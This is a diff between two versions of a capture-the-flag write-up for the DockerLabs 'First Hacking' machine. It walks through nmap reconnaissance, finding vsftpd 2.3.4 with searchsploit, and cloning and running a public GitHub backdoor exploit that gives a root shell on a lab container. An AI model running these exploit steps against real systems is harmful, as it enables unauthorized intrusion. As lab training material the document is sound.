@@ -1,87 +1,101 @@
----
-title: First Hacking
-description: First Hacking DockerLabs walkthrough covering reconnaissance, exploitation, and privilege escalation.
-hide:
-  - navigation
----
+# Write Up First Hacking
 
-# First Hacking
+**Difficulty:** Super easy<br>
+**Link to dockerlabs:** https://dockerlabs.es/
 
-- Difficulty: Super easy
-- Time to read: 6 minutes
-- Tags: dockerlabs, ftp, privilege-escalation, enumeration, exploitation
+## Setting the enviroment
+First of all we deploy the machine with the script that comes when downloading the machine
+```
+❯ chmod +x auto_deploy.sh
+❯ sudo ./auto_deploy.sh firsthacking.tar
 
-## Introduction
+Estamos desplegando la máquina vulnerable, espere un momento.
 
-This lab is a simple but useful introduction to enumeration, exploitation, and privilege escalation in a controlled environment. The machine exposes a single FTP service and demonstrates how an outdated service version can be abused quickly.
+Máquina desplegada, su dirección IP es -→ 172.17.0.2
 
-## Enumeración
-
-The first step is to deploy the vulnerable machine and run a recon scan.
-
-```bash
-chmod +x auto_deploy.sh
-sudo ./auto_deploy.sh firsthacking.tar
-nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
+Presiona Ctrl+C cuando termines con la máquina para eliminarla
 ```
 
-We identify the following service:
+Once deployed, we create the firsthacking folder, go inside and use the *mkt* utility that creates the *nmap*, *content*, *exploits* and *scripts* folders.
 
-```text
+```
+❯ mkdir firsthacking-dockerlabs
+❯ cd firsthacking-dockerlabs
+❯ mkt
+❯ ls -l
+drwxrwxr-x godack godack 4.0 KB Thu Aug 14 19:20:29 2025 content
+drwxrwxr-x godack godack 4.0 KB Thu Aug 14 19:20:29 2025 exploits
+drwxrwxr-x godack godack 4.0 KB Thu Aug 14 19:20:29 2025 nmap
+drwxrwxr-x godack godack 4.0 KB Thu Aug 14 19:20:29 2025 scripts
+```
+## Recon
+The first thing we do is a general reconnaissance with nmap on the victim machine, to obtain the open ports.
+```
+❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
+
 PORT   STATE SERVICE REASON
 21/tcp open  ftp     syn-ack ttl 64
 ```
 
-Then we perform a more detailed scan:
+Once we have the open ports, we perform a more thorough scan using reconnaissance scripts to obtain the services on each port and the version they are running.
 
-```bash
-nmap -sCV -p21 172.17.0.2 -oN targeted
 ```
+❯ extractPorts allPorts
+[*] Extracting information...
+ 
+     [*] IP Address: 172.17.0.2
+     [*] Open ports: 21
+ 
+[*] Ports copied to clipboard
 
-This reveals:
+❯ nmap -sCV -p21 172.17.0.2 -oN targeted
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 19:17 CEST
+Nmap scan report for 172.17.0.2
+Host is up (0.00018s latency).
 
-```text
+PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 2.3.4
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+Service Info: OS: Unix
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 2.71 seconds
 ```
 
-## Explotación
+In this way we discover that the service running on port 21 (FTP port) is vsftpd version 2.3.4.
 
-The vulnerable service version is quickly identified via searchsploit:
-
-```bash
-searchsploit vsftpd 2.3.4
+## Exploit
+Once we have recognized the ports and services, we realize that when searching with searchsploit, the vsftpd service with version 2.3.4 is a vulnerable service.
+```
+❯ searchsploit vsftpd 2.3.4
+-------------------------------------------------------- ---------------------------------
+ Exploit Title                                          |  Path
+-------------------------------------------------------- ---------------------------------
+vsftpd 2.3.4 - Backdoor Command Execution               | unix/remote/49757.py
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)  | unix/remote/17491.rb
+-------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
 ```
 
-The environment is then exploited using the public PoC for the backdoor vulnerability:
+In this way, we searched on GitHub for exploits for this vulnerability, and we found this repository, we downloaded it and executed it (https://github.com/Hellsender01/vsftpd_2.3.4_Exploit).
 
-```bash
-git clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit.git
-sudo python3 -m pip install pwntools
-python3 exploit.py 172.17.0.2
 ```
-
-The result is a root shell:
-
-```text
+❯ git clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit.git
+❯ sudo python3 -m pip install pwntools
+❯ python3 exploit.py 172.17.0.2
 [+] Got Shell!!!
+[+] Opening connection to 172.17.0.2 on port 21: Done
+[*] Closed connection to 172.17.0.2 port 21
+[+] Opening connection to 172.17.0.2 on port 6200: Done
+[*] Switching to interactive mode
 $ whoami
 root
+$  
 ```
 
-## Escalada de privilegios
+And finally we have access to the machine and we don't have to scale privileges because we are already root user!!
 
-No additional privilege escalation was required because the vulnerability itself grants direct root access in this lab scenario.
-
-## Lecciones aprendidas
-
-- Reconnaissance is key to choosing the right exploit path.
-- Legacy service versions are a common source of easy wins in labs and misconfigured environments.
-- Searchsploit and public PoCs can accelerate threat validation when used responsibly in a controlled setup.
-
-## Herramientas usadas
-
-- Nmap
-- Searchsploit
-- GitHub PoC repos
-- FTP service exploitation tooling
-- pwntools
+## Lessons Learned
+1. Scans with **nmap**
+2. Use of **searchsploit**
+3. Searching for exploits on GitHub
